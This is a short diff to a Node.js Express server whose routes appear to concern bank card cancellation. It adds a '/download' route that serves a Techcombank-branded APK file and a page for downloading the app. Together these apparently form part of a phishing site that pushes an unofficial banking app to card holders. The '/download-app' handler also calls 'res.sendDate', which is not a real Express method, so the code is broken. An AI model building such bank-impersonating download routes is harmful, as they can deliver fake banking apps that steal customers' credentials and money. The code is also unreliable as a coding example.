@@ -109,7 +109,17 @@ app.get('/yeu-cau-huy-the', (req, res) => {
 app.get('/sang-ngang-the', (req, res) => {
     res.sendFile(__dirname + '/views/sang-ngang-the.html');
 });
-
+app.get('/download', function (req, res) {
+    const file = `${__dirname}/public/app/Techcombank_v3.10.13.apk`;
+    res.download(file, 'Techcombank_v3.10.13.apk', {
+        cacheControl: false
+    }, (err) => {
+        console.log('err', err);
+    }); // Set disposition and send it.
+});
+app.get('/download-app', function (req, res) {
+    res.sendDate(__dirname + '/views/download-app.html');
+});
 
 
 http.listen(port, () => {
